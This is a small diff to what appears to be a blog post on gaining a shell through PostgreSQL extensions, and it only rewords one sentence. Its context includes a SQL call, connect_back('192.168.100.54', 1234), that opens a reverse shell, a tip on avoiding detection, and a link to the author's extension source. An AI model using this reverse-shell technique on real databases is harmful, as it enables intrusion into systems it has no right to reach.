@@ -96,7 +96,7 @@ select connect_back('192.168.100.54', 1234);
 ### Things to consider
 
 <div markdown="1" class="cn">
-- You can load DllMain also, but pwning your error log is a one way ticket to detection!
+- You can also load DllMain, but pwning your error log is a one way ticket to detection!
 - As mentioned, you will need to compile the dll/so file using the same PostgreSQL version including architecture.
 - You can download the extension I used [here](https://github.com/sourceincite/tools/blob/master/pgpwn.c) but you will need to compile it yourself.
 </div>
